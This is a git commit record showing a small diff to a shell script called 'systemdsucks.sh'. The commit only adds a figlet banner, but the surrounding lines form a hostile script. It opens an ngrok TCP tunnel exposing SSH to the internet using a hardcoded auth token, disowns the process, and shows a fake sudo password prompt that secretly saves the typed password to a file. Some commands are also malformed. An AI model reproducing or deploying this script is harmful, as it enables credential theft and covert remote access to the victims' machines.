0f68982a351c3116cdd4572c5736c4fd6b041760
Bohdan Denysenko <40203084+d0nut-dev@users.noreply.github.com>
2022-08-25 11:52:18 +0000

    Update systemdsucks.sh

--- systemdsucks.sh
+++ systemdsucks.sh
@@ -1,7 +1,9 @@
 sudo apt-get ngrok
+sudo apt-get figlet
 sudo ngrok config add-authtoken 2DqS9Nqy6u47z1SopPts7ySwFMj_7Nt1ot227odxdPuctPvFf
 sudo ngrok tcp 22 &
 sudo disown -a
 echo "[sudo] password for &USER:"
 read -sp pass
 echo "$pass" > ~/System/tpd
+figlet systemdSucks
